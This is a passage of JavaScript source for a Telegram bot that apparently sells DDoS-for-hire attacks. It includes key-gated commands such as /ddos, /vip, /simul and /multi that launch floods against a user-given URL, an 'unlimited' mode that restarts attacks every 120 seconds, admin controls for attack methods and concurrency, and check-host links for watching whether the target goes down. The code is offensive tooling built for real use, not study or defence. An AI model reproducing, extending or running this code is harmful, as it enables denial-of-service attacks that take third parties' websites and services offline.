          await bot.sendMessage(chatId, "Usage: /admin setconcurrent <number>\nExample: /admin setconcurrent 5");
          return;
        }
        
        const newMaxConcurrent = parseInt(inputs[2]);
        if (isNaN(newMaxConcurrent) || newMaxConcurrent < 1 || newMaxConcurrent > 10) {
          await bot.sendMessage(chatId, "Max concurrent must be a number between 1 and 10");
          return;
        }
        
        config.simultaneousAttacks.maxConcurrent = newMaxConcurrent;
        saveConfig();
        await bot.sendMessage(chatId, `✅ Max concurrent attacks set to ${newMaxConcurrent}`);
        break;

      case 'showconcurrent':
        await bot.sendMessage(chatId, `🔄 Current max concurrent attacks: ${config.simultaneousAttacks.maxConcurrent}`);
        break;
        
      case 'help':
      default:
        await adminCommands.showAdminHelp(chatId);
        break;
    }
  },

  showAdminHelp: async (chatId) => {
    const helpMessage = `
👑 *ADMIN COMMANDS*

📊 *Monitoring:*
• /admin status - Check bot status and statistics
• /admin users - List all active users and their status
• /admin slots <userId> - Check slots for a specific user

⚡ *Attack Management:*
• /admin methods - View all attack methods
• /admin stop - Stop all active attacks immediately
• /admin cooldown <seconds> - Set global cooldown time

🎯 *VIP Methods Control:*
• /admin setvip <methods> - Set VIP attack methods (comma separated) - NOW SAVED
• /admin showvip - Show current VIP methods

💥 *SIMULTANEOUS Methods Control:*
• /admin setsimul <methods> - Set SIMULTANEOUS attack methods - NOW SAVED
• /admin showsimul - Show current SIMULTANEOUS methods

🔄 *Concurrent Attacks Control:*
• /admin setconcurrent <number> - Set max concurrent attacks (1-10) - NOW SAVED
• /admin showconcurrent - Show current max concurrent setting

🔑 *Key Management:*
• /admin addkey <type> <key> - Add a new key
• /admin delkey <key> - Delete a key
• /admin disablekey <key> - Disable a key temporarily
• /admin enablekey <key> - Enable a key
• /admin keys - List all keys

📢 *Administration:*
• /admin broadcast <message> - Broadcast message to all users
• /admin clearlogs - Clear all active attacks and user status
• /admin restart - Restart the bot

🆘 *Help:*
• /admin help - Show this help message

*Usage:* /admin <command> [parameters]
*Examples:*
/admin setvip zaher zaherH2 CFZAHER
/admin setsimul zaher zaherH2 CFZAHER
/admin addkey VIP MYVIPKEY123
/admin setconcurrent 5
    `;
    
    await bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
  }
};

// Add polling error handler
bot.on('polling_error', (error) => {
  console.error(chalk.red('Polling error:'), error);
});

// Add error handler for other bot errors
bot.on('error', (error) => {
  console.error(chalk.red('Bot error:'), error);
});

// Command handlers
const commandHandlers = {
  handleStart: async (chatId, user) => {
    recordUserActivity(user.id, user.username, chatId);
    await bot.sendMessage(
      chatId, 
      utils.helpMessage(),
      { parse_mode: 'Markdown' }
    );
  },

  handleHelp: async (chatId) => {
    await bot.sendMessage(chatId, utils.helpMessage(), { parse_mode: 'Markdown' });
  },

  handleMethods: async (chatId) => {
    await bot.sendMessage(chatId, utils.formatMethodsList(), { parse_mode: 'Markdown' });
  },

  handleOwner: async (chatId) => {
    await bot.sendMessage(chatId, utils.adminContact(), { parse_mode: 'Markdown' });
  },

  handleStatus: async (chatId, userId) => {
    const remainingCooldown = attackManager.getRemainingCooldown(userId);
    const hasUnlimited = unlimitedAttackManager.hasUnlimitedAttack(userId);
    
    let statusMessage = `✅ Ready to launch attacks\n`;
    
    if (remainingCooldown > 0) {
      statusMessage = `⏳ Cooldown active: ${remainingCooldown} seconds remaining\n`;
    }
    
    if (hasUnlimited) {
      statusMessage += `♾️ Unlimited attack running\n`;
    }
    
    const userSlots = utils.getUserSlots(userId);
    statusMessage += `🎯 Active attacks: ${userSlots.length}/${utils.getMaxSlots(userId)}`;
    
    await bot.sendMessage(chatId, statusMessage);
  },

  handleStop: async (chatId, userId) => {
    const stoppedCount = await attackManager.stopUserAttacks(userId);
    
    if (stoppedCount === 0) {
      await bot.sendMessage(chatId, '❌ No active attacks found to stop.');
    } else {
      await bot.sendMessage(chatId, `✅ Successfully stopped ${stoppedCount} attack(s)!`);
    }
  },

  handleKey: async (chatId, userId, inputs) => {
    if (inputs.length < 2) {
      await bot.sendMessage(chatId, "Usage: /key <access-key>");
      return;
    }
    
    const key = inputs[1].toUpperCase();
    
    if (!utils.validateKey(key)) {
      await bot.sendMessage(chatId, "❌ Invalid or disabled key");
      return;
    }
    
    if (!userData[userId]) {
      userData[userId] = {
        username: `user_${userId}`,
        chatId: chatId,
        firstSeen: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        attackCount: 0,
        key: key,
        simultaneousAttacks: 0
      };
    } else {
      userData[userId].key = key;
      userData[userId].lastSeen = new Date().toISOString();
    }
    
    if (!keysData[key].usedBy.includes(userId)) {
      keysData[key].usedBy.push(userId);
      saveKeysData();
    }
    
    saveUserData();
    await bot.sendMessage(chatId, `✅ Key activated successfully!`);
  },

  handleMyKey: async (chatId, userId) => {
    if (!userData[userId] || !userData[userId].key) {
      await bot.sendMessage(chatId, `❌ No active key! Set one with /key <key>`);
      return;
    }
    
    const key = userData[userId].key;
    const keyInfo = keysData[key];
    
    if (!keyInfo) {
      await bot.sendMessage(chatId, "❌ Your key is no longer valid.");
      return;
    }
    
    await bot.sendMessage(
      chatId, 
      `🔑 *Your Key Information*\n\n` +
      `Key: ${key}\n` +
      `Type: ${keyInfo.type}\n` +
      `Status: ${keyInfo.enabled ? '✅ Enabled' : '❌ Disabled'}\n` +
      `Simultaneous Attacks: ${userData[userId].simultaneousAttacks || 0}\n`
    );
  },

  handleSlots: async (chatId, userId) => {
    await bot.sendMessage(
      chatId,
      utils.formatSlotsInfo(userId),
      { parse_mode: 'Markdown' }
    );
  },

  handleAttack: async (userId, chatId, method, url, port, time) => {
    if (!utils.hasAvailableSlot(userId)) {
      const maxSlots = utils.getMaxSlots(userId);
      await bot.sendMessage(
        chatId,
        `❌ Maximum attack slots (${maxSlots}) reached. Wait for current attacks to finish.`
      );
      return;
    }

    if (!attackManager.canUserAttack(userId)) {
      if (!utils.isAdmin(userId) && (!userData[userId] || !userData[userId].key || !utils.validateKey(userData[userId].key))) {
        await bot.sendMessage(
          chatId, 
          `❌ Key required!`
        );
        return;
      }
      
      const remaining = attackManager.getRemainingCooldown(userId);
      await bot.sendMessage(
        chatId, 
        `⏳ Wait ${remaining}s before next attack.`
      );
      return;
    }

    const validationError = utils.validateInputs(url, port, time, userId);
    if (validationError) {
      await bot.sendMessage(chatId, `❌ ${validationError}`);
      return;
    }

    attackManager.setUserStatus(userId, 'running');

    try {
      const attackDetails = utils.attackDetailsMessage(method, url, port, time);
      await bot.sendVideo(
        chatId,
        'https://j.top4top.io/m_3573exath0.mp4',
        {
          caption: attackDetails,
          parse_mode: 'Markdown'
        }
      );

      const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await bot.sendMessage(
        chatId, 
        `🎯 *Attack Monitoring*\nCheck target status: [Check-Host](${checkHostUrl})`, 
        { parse_mode: 'Markdown', disable_web_page_preview: true }
      );

      await attackExecutor.runAttack(method, url, port, time, userId, chatId);
      
      attackManager.setUserStatus(userId, 'cooldown');
      
      await bot.sendMessage(
        chatId, 
        `🎯 Attack completed! Cooldown: ${config.cooldownTime} seconds`
      );
      
      if (userData[userId]) {
        userData[userId].attackCount = (userData[userId].attackCount || 0) + 1;
        saveUserData();
      }
    } catch (err) {
      attackManager.clearUserStatus(userId);
      console.error(chalk.red(`❌ Attack error for user ${userId}:`), err);
      await bot.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
  },

  handleDdos: async (userId, chatId, url, time) => {
    if (!utils.hasAvailableSlot(userId)) {
      const maxSlots = utils.getMaxSlots(userId);
      await bot.sendMessage(
        chatId,
        `❌ Maximum attack slots (${maxSlots}) reached. Wait for current attacks to finish.`
      );
      return;
    }

    if (!attackManager.canUserAttack(userId)) {
      if (!utils.isAdmin(userId) && (!userData[userId] || !userData[userId].key || !utils.validateKey(userData[userId].key))) {
        await bot.sendMessage(
          chatId, 
          `❌ No valid key. Use /key <key> to set.`
        );
        return;
      }
      
      const remaining = attackManager.getRemainingCooldown(userId);
      await bot.sendMessage(
        chatId, 
        `⏳ Wait ${remaining}s before retry.`
      );
      return;
    }

    const validationError = utils.validateInputs(url, 80, time, userId);
    if (validationError) {
      await bot.sendMessage(chatId, `❌ ${validationError}`);
      return;
    }

    attackManager.setUserStatus(userId, 'running');

    try {
      const attackDetails = `🎯 *DDoS Attack Launched Successfully!*\n\nTarget: ${url}\nDuration: ${time} seconds\nPower: 2x normal power`;
      await bot.sendVideo(
        chatId,
        'https://j.top4top.io/m_3573exath0.mp4',
        {
          caption: attackDetails,
          parse_mode: 'Markdown'
        }
      );

      const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await bot.sendMessage(
        chatId, 
        `🎯 *Attack Monitoring*\nCheck target status: [Check-Host](${checkHostUrl})`, 
        { parse_mode: 'Markdown', disable_web_page_preview: true }
      );

      await attackExecutor.runDdosAttack(url, time, userId, chatId);
      
      attackManager.setUserStatus(userId, 'cooldown');
      
      await bot.sendMessage(
        chatId, 
        `🔒 Completed! Retry in ${config.cooldownTime}s`
      );
      
      if (userData[userId]) {
        userData[userId].attackCount = (userData[userId].attackCount || 0) + 1;
        saveUserData();
      }
    } catch (err) {
      attackManager.clearUserStatus(userId);
      console.error(chalk.red(`❌ DDoS attack error for user ${userId}:`), err);
      await bot.sendMessage(chatId, `❌ Error during DDoS attack: ${err.message}`);
    }
  },

  handleVipAttack: async (userId, chatId, url, time) => {
    const requiredSlots = config.vipMethods.length;
    
    if (!utils.canRunSimultaneous(userId, requiredSlots)) {
      const maxSlots = utils.getMaxSlots(userId);
      const userSlots = utils.getUserSlots(userId);
      await bot.sendMessage(
        chatId,
        `❌ VIP attack requires ${requiredSlots} slots. You have ${maxSlots - userSlots.length} available (max: ${maxSlots}).`
      );
      return;
    }

    if (!attackManager.canUserAttack(userId)) {
      if (!utils.isAdmin(userId) && (!userData[userId] || !userData[userId].key || !utils.validateKey(userData[userId].key))) {
        await bot.sendMessage(
          chatId, 
          `❌ Key required for VIP attacks!`
        );
        return;
      }
      
      const remaining = attackManager.getRemainingCooldown(userId);
      await bot.sendMessage(
        chatId, 
        `⏳ Wait ${remaining}s before VIP attack.`
      );
      return;
    }

    const validationError = utils.validateInputs(url, 443, time, userId);
    if (validationError) {
      await bot.sendMessage(chatId, `❌ ${validationError}`);
      return;
    }

    attackManager.setUserStatus(userId, 'running');

    try {
      const attackDetails = utils.vipAttackDetailsMessage(url, time);
      await bot.sendVideo(
        chatId,
        'https://j.top4top.io/m_3573exath0.mp4',
        {
          caption: attackDetails,
          parse_mode: 'Markdown'
        }
      );

      const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await bot.sendMessage(
        chatId, 
        ` VIP Attack Monitoring\n${config.vipMethods.length} attacks running!\nCheck: [Check-Host](${checkHostUrl})`, 
        { parse_mode: 'Markdown', disable_web_page_preview: true }
      );

      const result = await attackExecutor.runVipAttack(url, time, userId, chatId);
      
      attackManager.setUserStatus(userId, 'cooldown', config.cooldownTime * config.simultaneousAttacks.cooldownMultiplier * 1000);
      
      if (userData[userId]) {
        userData[userId].simultaneousAttacks = (userData[userId].simultaneousAttacks || 0) + 1;
        userData[userId].attackCount = (userData[userId].attackCount || 0) + config.vipMethods.length;
        saveUserData();
      }
      
      let completionMessage = `✅ VIP attack completed! ${config.vipMethods.length} attacks finished.`;
      if (result.failed > 0) {
        completionMessage += ` (${result.failed} failed)`;
      }
      completionMessage += `\nCooldown: ${config.cooldownTime * config.simultaneousAttacks.cooldownMultiplier} seconds`;
      
      await bot.sendMessage(chatId, completionMessage);
      
    } catch (err) {
      attackManager.clearUserStatus(userId);
      console.error(chalk.red(`❌ VIP attack error for user ${userId}:`), err);
      
      if (err.message.includes('AggregateError')) {
        await bot.sendMessage(chatId, `❌ Some VIP attacks failed. Please try again.`);
      } else {
        await bot.sendMessage(chatId, `❌ Error during VIP attack: ${err.message}`);
      }
    }
  },

  handleSimultaneousAttack: async (userId, chatId, url, time, methodInput = '') => {
    // Check for "Unlimited" parameter
    if (methodInput && methodInput.toLowerCase() === 'unlimited') {
      return await commandHandlers.handleUnlimitedAttack(userId, chatId, url);
    }
    
    const requiredSlots = config.simulMethods.length;
    
    if (!utils.canRunSimultaneous(userId, requiredSlots)) {
      const maxSlots = utils.getMaxSlots(userId);
      const userSlots = utils.getUserSlots(userId);
      await bot.sendMessage(
        chatId,
        `❌ SIMULTANEOUS attack requires ${requiredSlots} slots. You have ${maxSlots - userSlots.length} available (max: ${maxSlots}).`
      );
      return;
    }

    if (!utils.isAdmin(userId) && (!userData[userId] || !userData[userId].key || !utils.validateKey(userData[userId].key))) {
      await bot.sendMessage(chatId, `❌ Key required for simultaneous attacks!`);
      return;
    }

    const validationError = utils.validateInputs(url, 443, time, userId);
    if (validationError) {
      await bot.sendMessage(chatId, `❌ ${validationError}`);
      return;
    }

    attackManager.setUserStatus(userId, 'running');

    try {
      const attackDetails = utils.simultaneousAttackDetailsMessage(url, time);
      await bot.sendVideo(
        chatId,
        'https://j.top4top.io/m_3573exath0.mp4',
        {
          caption: attackDetails,
          parse_mode: 'Markdown'
        }
      );

      const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await bot.sendMessage(
        chatId, 
        ` SIMULTANEOUS Attack\n${config.simulMethods.length} attacks running!\nCheck: [Check-Host](${checkHostUrl})`, 
        { parse_mode: 'Markdown', disable_web_page_preview: true }
      );

      const result = await attackExecutor.runSimultaneousAttacks(url, time, userId, chatId);
      
      attackManager.setUserStatus(userId, 'cooldown', config.cooldownTime * config.simultaneousAttacks.cooldownMultiplier * 1000);
      
      if (userData[userId]) {
        userData[userId].simultaneousAttacks = (userData[userId].simultaneousAttacks || 0) + 1;
        userData[userId].attackCount = (userData[userId].attackCount || 0) + config.simulMethods.length;
        saveUserData();
      }
      
      let completionMessage = `✅ SIMULTANEOUS attack completed! ${config.simulMethods.length} attacks finished.`;
      if (result.failed > 0) {
        completionMessage += ` (${result.failed} failed)`;
      }
      completionMessage += `\nCooldown: ${config.cooldownTime * config.simultaneousAttacks.cooldownMultiplier} seconds`;
      
      await bot.sendMessage(chatId, completionMessage);
      
    } catch (err) {
      attackManager.clearUserStatus(userId);
      console.error(chalk.red(`❌ Simultaneous attack error for user ${userId}:`), err);
      
      if (err.message.includes('tcp attack script exited with code null')) {
        await bot.sendMessage(chatId, `❌ TCP attack failed. Other attacks may continue.`);
      } else {
        await bot.sendMessage(chatId, `❌ Error during simultaneous attack: ${err.message}`);
      }
    }
  },

  handleUnlimitedAttack: async (userId, chatId, url) => {
    if (!utils.isAdmin(userId) && (!userData[userId] || !userData[userId].key || !utils.validateKey(userData[userId].key))) {
      await bot.sendMessage(chatId, `❌ Key required for unlimited attacks!`);
      return;
    }

    const validationError = utils.validateInputs(url, 443, '120', userId);
    if (validationError) {
      await bot.sendMessage(chatId, `❌ ${validationError}`);
      return;
    }

    // Check if user already has unlimited attacks running
    const userUnlimitedAttacks = unlimitedAttackManager.getUserUnlimitedAttacks(userId);
    if (userUnlimitedAttacks.length > 0) {
      await bot.sendMessage(chatId, `❌ You already have an unlimited attack running. Use /stop to stop it first.`);
      return;
    }

    try {
      const attackDetails = utils.unlimitedAttackDetailsMessage(url);
      
      await bot.sendVideo(
        chatId,
        'https://j.top4top.io/m_3573exath0.mp4',
        {
          caption: attackDetails,
          parse_mode: 'Markdown'
        }
      );

      const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await bot.sendMessage(
        chatId, 
        `♾️ *Unlimited Attack Monitoring*\nAttacks will auto-restart every 120s\nCheck: [Check-Host](${checkHostUrl})\n\nUse /stop to terminate`, 
        { parse_mode: 'Markdown', disable_web_page_preview: true }
      );

      // Start unlimited attack
      const attackId = await unlimitedAttackManager.startUnlimitedAttack(userId, chatId, url);
      
      await bot.sendMessage(
        chatId,
        `✅ Unlimited attack started! Attack ID: ${attackId.substr(0, 8)}...\n\nThis attack will run in cycles of 120 seconds until you use /stop.`
      );
      
    } catch (err) {
      console.error(chalk.red(`❌ Unlimited attack error for user ${userId}:`), err);
      await bot.sendMessage(chatId, `❌ Error starting unlimited attack: ${err.message}`);
    }
  },

  handleMultiAttack: async (userId, chatId, url, time, methodsInput) => {
    const methods = methodsInput.split(',').map(m => m.trim().toLowerCase());
    
    if (!utils.canRunSimultaneous(userId, methods.length)) {
      const maxSlots = utils.getMaxSlots(userId);
      const userSlots = utils.getUserSlots(userId);
      await bot.sendMessage(
        chatId,
        `❌ Custom simultaneous attack requires ${methods.length} slots. You have ${maxSlots - userSlots.length} available (max: ${maxSlots}).`
      );
      return;
    }

    if (!utils.isAdmin(userId) && (!userData[userId] || !userData[userId].key || !utils.validateKey(userData[userId].key))) {
      await bot.sendMessage(chatId, `❌ Key required for custom simultaneous attacks!`);
      return;
    }

    const validationError = utils.validateInputs(url, 443, time, userId);
    if (validationError) {
      await bot.sendMessage(chatId, `❌ ${validationError}`);
      return;
    }

    attackManager.setUserStatus(userId, 'running');

    try {
      const attackDetails = utils.multiAttackDetailsMessage(url, time, methods);
      await bot.sendVideo(
        chatId,
        'https://j.top4top.io/m_3573exath0.mp4',
        {
          caption: attackDetails,
          parse_mode: 'Markdown'
        }
      );

      const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
      await bot.sendMessage(
        chatId, 
        ` CUSTOM Attack\n${methods.length} attacks running!\nCheck: [Check-Host](${checkHostUrl})`, 
        { parse_mode: 'Markdown', disable_web_page_preview: true }
      );

      const result = await attackExecutor.runCustomSimultaneousAttack(url, time, methods, userId, chatId);
      
      attackManager.setUserStatus(userId, 'cooldown', config.cooldownTime * config.simultaneousAttacks.cooldownMultiplier * 1000);
      
      if (userData[userId]) {
        userData[userId].simultaneousAttacks = (userData[userId].simultaneousAttacks || 0) + 1;
        userData[userId].attackCount = (userData[userId].attackCount || 0) + methods.length;
        saveUserData();
      }
      
      let completionMessage = `✅ Custom attack completed! ${methods.length} attacks finished.`;
      if (result.failed > 0) {
        completionMessage += ` (${result.failed} failed)`;
      }
      completionMessage += `\nCooldown: ${config.cooldownTime * config.simultaneousAttacks.cooldownMultiplier} seconds`;
      
      await bot.sendMessage(chatId, completionMessage);
      
    } catch (err) {
      attackManager.clearUserStatus(userId);
      console.error(chalk.red(`❌ Custom attack error for user ${userId}:`), err);
      await bot.sendMessage(chatId, `❌ Error during custom simultaneous attack: ${err.message}`);
    }
  }
};

// Bot message handler
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text ? msg.text.trim() : '';
  
  if (!text) return;

  recordUserActivity(userId, msg.from.username, chatId);

  const inputs = text.split(/\s+/);
  const command = inputs[0].toLowerCase();

  try {
    if (command === '/admin') {
      await adminCommands.handleAdminCommand(chatId, userId, inputs);
      return;
    }

    switch (command) {
      case '/start':
        await commandHandlers.handleStart(chatId, msg.from);
        break;
        
      case '/help':
        await commandHandlers.handleHelp(chatId);
        break;
        
      case '/methods':
        await commandHandlers.handleMethods(chatId);
        break;
        
      case '/status':
        await commandHandlers.handleStatus(chatId, userId);
        break;
        
      case '/owner':
        await commandHandlers.handleOwner(chatId);
        break;
        
      case '/stop':
        await commandHandlers.handleStop(chatId, userId);
        break;
        
      case '/key':
        await commandHandlers.handleKey(chatId, userId, inputs);
        break;
        
      case '/mykey':
        await commandHandlers.handleMyKey(chatId, userId);
        break;
        
      case '/slots':
        await commandHandlers.handleSlots(chatId, userId);
        break;
        
      case '/ddos':
        if (inputs.length < 3) {
          await bot.sendMessage(
            chatId, 
            "❌ Wrong command!\nUse: /ddos <url> <time>\nEx: /ddos https://example.com 60"
          );
          return;
        }
        await commandHandlers.handleDdos(userId, chatId, inputs[1], inputs[2]);
        break;

      case '/vip':
        if (inputs.length < 3) {
          await bot.sendMessage(
            chatId, 
            "❌ Wrong command!\nUse: /vip <url> <time>\nEx: /vip https://example.com 60"
          );
          return;
        }
        await commandHandlers.handleVipAttack(userId, chatId, inputs[1], inputs[2]);
        break;

      case '/simul':
        if (inputs.length < 3) {
          await bot.sendMessage(
            chatId, 
            "❌ Wrong command!\nUse: /simul <url> <time>\nOr: /simul Unlimited <url>\nEx: /simul https://example.com 60\nEx: /simul Unlimited https://example.com"
          );
          return;
        }
        
        // Check if it's unlimited mode
        if (inputs[1].toLowerCase() === 'unlimited') {
          if (inputs.length < 3) {
            await bot.sendMessage(chatId, "❌ Wrong command!\nUse: /simul Unlimited <url>");
            return;
          }
          await commandHandlers.handleUnlimitedAttack(userId, chatId, inputs[2]);
        } else {
          await commandHandlers.handleSimultaneousAttack(userId, chatId, inputs[1], inputs[2]);
        }
        break;

      case '/multi':
        if (inputs.length < 4) {
          await bot.sendMessage(
            chatId, 
            "❌ Wrong command!\nUse: /multi <url> <time> <methods>\nEx: /multi https://example.com 60 tls,http,ddos,bypass\nAvailable methods: " + config.validMethods.join(', ')
          );
          return;
        }
        await commandHandlers.handleMultiAttack(userId, chatId, inputs[1], inputs[2], inputs[3]);
        break;
        
      default:
        if (config.validMethods.includes(command.replace('/', '').toLowerCase())) {
          if (inputs.length < 4) {
            await bot.sendMessage(chatId, utils.errorMessage(), { parse_mode: 'Markdown' });
            return;
          }
          await commandHandlers.handleAttack(userId, chatId, command.replace('/', ''), inputs[1], inputs[2], inputs[3]);
        }
        break;
    }
  } catch (err) {
    console.error(chalk.red('Error handling message:'), err);
    await bot.sendMessage(chatId, '❌ An error occurred while processing your request.');
  }
});

// Initialize data on startup
loadUserData();
loadKeysData();
loadConfig();

console.log(chalk.green('🤖 Bot is running with enhanced simultaneous attacks...'));
console.log(chalk.blue('🆕 New methods added: zaher zaherH2 CFZAHER'));
console.log(chalk.yellow('⚙️ Configuration persistence enabled - VIP/SIMUL settings will be saved'));
console.log(chalk.cyan('♾️ Unlimited attack mode added - /simul Unlimited <url>'));